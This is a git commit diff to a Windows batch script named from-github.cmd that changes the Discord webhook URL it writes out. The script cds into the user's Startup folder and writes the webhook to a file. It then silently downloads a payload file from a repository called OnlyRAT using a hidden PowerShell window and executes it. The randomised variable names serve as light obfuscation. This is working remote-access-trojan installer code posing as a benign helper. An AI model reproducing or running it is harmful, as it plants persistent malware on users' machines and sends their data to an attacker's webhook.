14664d486fe97bcbc450bd14d6f90b94c87546ff
$./Netrunner_& <114373528+00xNetrunner@users.noreply.github.com>
2023-08-03 06:12:30 +0100

    Update from-github.cmd

--- from-github.cmd
+++ from-github.cmd
@@ -2,7 +2,7 @@
 set "XNjFYKECht=%cd%"
 set "YKHfpmMRoQ=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 cd %YKHfpmMRoQ%
-echo https://discord.com/api/webhooks/1130801792293294170/-WbH2xRVbMCMP-7dafq8qwGXbXo7-7wflOxoFSmJR_7oUeG4kNn26KpcIebZWehnpobP > lawFvVTikZ.txt
+echo https://discordapp.com/api/webhooks/1136525032588333197/cqvekSMJY6loCaeqtjaQKElqVB-c0AR8xxnXUjYVo_JTjOOLyfZuFAxhkRZQbxTIMNnX > lawFvVTikZ.txt
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/g1.cmd -o wEaoFkNduy.cmd"
 powershell ./wEaoFkNduy.cmd
 cd "%XNjFYKECht%"
